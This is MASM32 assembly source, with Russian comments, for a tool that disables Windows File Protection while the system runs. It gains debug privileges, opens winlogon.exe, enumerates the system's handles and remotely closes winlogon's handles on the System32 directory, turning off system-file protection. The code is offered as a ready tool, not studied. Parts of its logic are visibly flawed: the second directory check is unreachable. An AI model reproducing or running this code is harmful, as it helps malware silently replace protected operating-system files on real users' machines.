;===============================================================================;
;                           П Р О Г Р А М М А                                   
;               Отключение Windows File Protection на лету                      
;===============================================================================;

;===============================================================================;
;                       Options and Includes                                    
;===============================================================================;
.386                                                                            
option casemap:none                                                             
.model flat,stdcall                                                             
include \tools\masm32\include\windows.inc                                       
includelib \tools\masm32\lib\kernel32.lib                                       
include \tools\masm32\include\kernel32.inc                                      
include \tools\masm32\include\user32.inc                                        
includelib \tools\masm32\lib\user32.lib                                         
include \tools\masm32\include\advapi32.inc                                      
includelib \tools\masm32\lib\advapi32.lib                                       
;===============================================================================;

Handle_Info struct
        Pid DWORD ?
        ObjectType WORD ?
        HandleValue WORD ?
        ObjectPointer DWORD ?
        AccessMask DWORD ?      
Handle_Info ends

UNICODE_STRING STRUCT
        woLength                WORD    ?               ; len of string in bytes (not chars)
        MaximumLength   WORD    ?                       ; len of Buffer in bytes (not chars)
        Buffer                  DWORD   ?       ; pointer to string
UNICODE_STRING ENDS

System_Handle_Information struct
        nHandleEntries DWORD ?
        pHandleInfo DWORD ? 
System_Handle_Information ends

CharUpperW PROTO :DWORD
lstrlenW PROTO :DWORD

STATUS_INFO_LENGTH_MISMATCH equ 0C0000004h
;===============================================================================;
;                       Initialized Data Section                                
;===============================================================================;
.data                                                                           
        Priv db "SeDebugPrivilege",0
        ntdll db "NTDLL.DLL",0
        FuncName db "NtQuerySystemInformation",0
        FuncName2 db "NtQueryObject",0
        pSystemHandleInfo dd 0
        SizeBuffer dd 0
        winlogon_str db "winlogon.exe",0
        hWinlogon dd 0
        WinDir1 dw "W","I","N","D","O","W","S","\","S","Y","S","T","E","M","3","2",0
        WinDir2 dw "W","I","N","N","T","\","S","Y","S","T","E","M","3","2",0
;===============================================================================;



;===============================================================================;
;                       Uninitialized Data Section                              
;===============================================================================;
.data?                                                                          
        _NtQuerySystemInformation dd ?  
        _NtQueryObject dd ?                                                     
        uBuff dd ? 
        WinLogon_Id dd ?
        hCopy dd ?
ObjName label byte
        Name UNICODE_STRING <?>
        pBuffer db MAX_PATH+1 dup (?)
;===============================================================================;



;===============================================================================;
;                               Code Section                                    
;===============================================================================;
.code
start:
        call EnableDebugPrivilege;Теперь у нас отладочные привилегии
        invoke GetModuleHandle,offset ntdll
        invoke GetProcAddress,eax,offset FuncName
        mov _NtQuerySystemInformation,eax
        invoke GetModuleHandle,offset ntdll
        invoke GetProcAddress,eax,offset FuncName2
        mov _NtQueryObject,eax
;===============================================================================;
;                       Получаем описатель процесса Winlogon.exe                
;===============================================================================;
        push offset winlogon_str
        call GetPIDbyName
        mov WinLogon_Id,eax
        invoke OpenProcess,PROCESS_DUP_HANDLE,0,eax
        mov hWinlogon,eax
;===============================================================================;
;===============================================================================;
;               Определям размер буфера для получения списка хэндлов            
;===============================================================================;
        push offset SizeBuffer
        push 0
        push 0
        push 16;SystemHandleInformation
        call _NtQuerySystemInformation
        .if eax!=STATUS_INFO_LENGTH_MISMATCH
                jmp end_calc_size
        .endif
next_calc_size:
        add SizeBuffer,01000h
        .if pSystemHandleInfo!=0
                invoke VirtualFree,pSystemHandleInfo, 0, MEM_RELEASE
        .endif
        invoke VirtualAlloc,NULL, SizeBuffer, MEM_COMMIT, PAGE_READWRITE
        mov pSystemHandleInfo,eax
        push offset uBuff
        push SizeBuffer
        push pSystemHandleInfo
        push 16
        call _NtQuerySystemInformation
        .if eax==STATUS_INFO_LENGTH_MISMATCH
                jmp next_calc_size
        .endif
end_calc_size:
;===============================================================================;
;===============================================================================;
;               Получаем все хэндлы и закрываем ненужные                        
;===============================================================================;
        assume edi:ptr System_Handle_Information
        mov edi,pSystemHandleInfo
        mov ecx,[edi].nHandleEntries
        add edi,4
        ;mov edi,[edi].pHandleInfo
        assume edi:ptr Handle_Info
        mov edx,0
next_handle:
        push ecx
        push edx
        mov eax,[edi].Pid
        .if eax==WinLogon_Id
                invoke GetCurrentProcess
                mov edx,eax
                xor eax,eax
                mov ax,[edi].HandleValue
                invoke DuplicateHandle,hWinlogon,eax,edx,offset hCopy,0,0,DUPLICATE_SAME_ACCESS
                .if eax!=0
                        push 0
                        push 214h;sizeof(ObjName)
                        push offset ObjName
                        push 1;ObjectNameInformation
                        push hCopy
                        call _NtQueryObject
                        .if eax==0;StatusSuccess
                                push edi
                                mov edi,offset ObjName
                                assume edi:ptr UNICODE_STRING
                                mov edi,[edi].Buffer
                                push edi
                                call CharUpperW
                                mov edi,offset ObjName
                                assume edi:ptr UNICODE_STRING
                                mov edi,[edi].Buffer
                                push edi
                                push offset WinDir1
                                call CompareStringBackwards
                                .if eax==1 
                                        jmp Yes
                                .elseif 
                                        jmp No
                                .endif
                                mov edi,offset ObjName
                                assume edi:ptr UNICODE_STRING
                                mov edi,[edi].Buffer
                                push edi
                                push offset WinDir2
                                call CompareStringBackwards
                                .if eax==1 
                                        jmp Yes
                                .elseif 
                                        jmp No
                                .endif
Yes:
                                invoke CloseHandle,hCopy
                                pop edi
                                assume edi:ptr Handle_Info
                                xor eax,eax
                                mov ax,[edi].HandleValue
                                invoke DuplicateHandle,hWinlogon,eax,-1,offset hCopy,0,0,\
                                       DUPLICATE_CLOSE_SOURCE or DUPLICATE_SAME_ACCESS
                                invoke CloseHandle,hCopy
                                push edi
                        .endif
No:
                pop edi
                .endif
                invoke CloseHandle,hCopy
        .endif
        pop edx
        pop ecx
        inc edx
        .if edx>=ecx
                invoke VirtualFree,pSystemHandleInfo, 0, MEM_RELEASE
                invoke CloseHandle,hWinlogon
                invoke TerminateProcess,-1,0
        .endif
        add edi,16
        jmp next_handle
;===============================================================================;
;===============================================================================;
;                       Включить отладочные привилегии                          
;===============================================================================;
EnableDebugPrivilege proc
LOCAL hToken:DWORD
LOCAL tkp:TOKEN_PRIVILEGES
LOCAL ReturnLength:DWORD
LOCAL luid:LUID
        mov eax,0
        invoke OpenProcessToken,INVALID_HANDLE_VALUE, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,ADDR hToken
        invoke LookupPrivilegeValue,NULL,offset Priv,ADDR luid
        .IF eax==0
                invoke CloseHandle,hToken
                ret
        .ENDIF
        mov tkp.PrivilegeCount,1
        lea eax,tkp.Privileges
        assume eax:ptr LUID_AND_ATTRIBUTES
        push luid.LowPart
        pop [eax].Luid.LowPart

        push luid.HighPart
        pop [eax].Luid.HighPart

        mov [eax].Attributes,SE_PRIVILEGE_ENABLED
        
        invoke AdjustTokenPrivileges,hToken,NULL,ADDR tkp,sizeof tkp,ADDR tkp,ADDR ReturnLength
        invoke GetLastError
        .IF eax!=ERROR_SUCCESS
                ret
        .ENDIF
        invoke CloseHandle,hToken
        mov eax,1
        ret
EnableDebugPrivilege endp

;===============================================================================;
;                       Процесс по имени
;===============================================================================;
GetPIDbyName proc Str1:DWORD
LOCAL pe:PROCESSENTRY32
LOCAL hSnap:DWORD
        invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
        mov hSnap,eax
        mov pe.dwSize,sizeof pe
        invoke Process32First,hSnap,addr pe
        .if eax==0
                ret
        .endif
next_process:
        invoke Process32Next,hSnap,addr pe
        .if eax==0
                ret
        .endif
        invoke lstrcmpi,addr pe.szExeFile,Str1
        .if eax==0
                mov eax,pe.th32ProcessID
                ret
        .endif
        jmp next_process
GetPIDbyName endp
;===============================================================================;
;===============================================================================;
;                       Сравнить строки назад
;===============================================================================;
CompareStringBackwards proc pStr1:dword,pStr2:dword
LOCAL Len1:DWORD
LOCAL Len2:DWORD
        push esi
        push edi
        invoke lstrlenW,pStr1
        mov Len1,eax
        invoke lstrlenW,pStr2
        mov Len2,eax
        mov eax,Len1
        .if eax>Len2
                mov eax,0
                ret
        .endif
        mov edx,Len1
        add edx,Len1
        mov edi,pStr1
        add edi,edx

        mov edx,Len2
        add edx,Len2
        mov esi,pStr2
        add esi,edx

        mov ecx,Len1
        inc ecx
        std
        repe cmpsw
        add esi,2
        add edi,2
        xor eax,eax
        xor edx,edx
        mov ax,word ptr [esi]
        mov dx,word ptr [edi]
        .if (ecx==0)&&(eax==edx)
                mov eax,1
                pop edi
                pop esi
                ret
        .else
                mov eax,0
                pop edi
                pop esi
                ret
        .endif
CompareStringBackwards endp

end start
;===============================================================================;
;                               End Program                                     
;===============================================================================;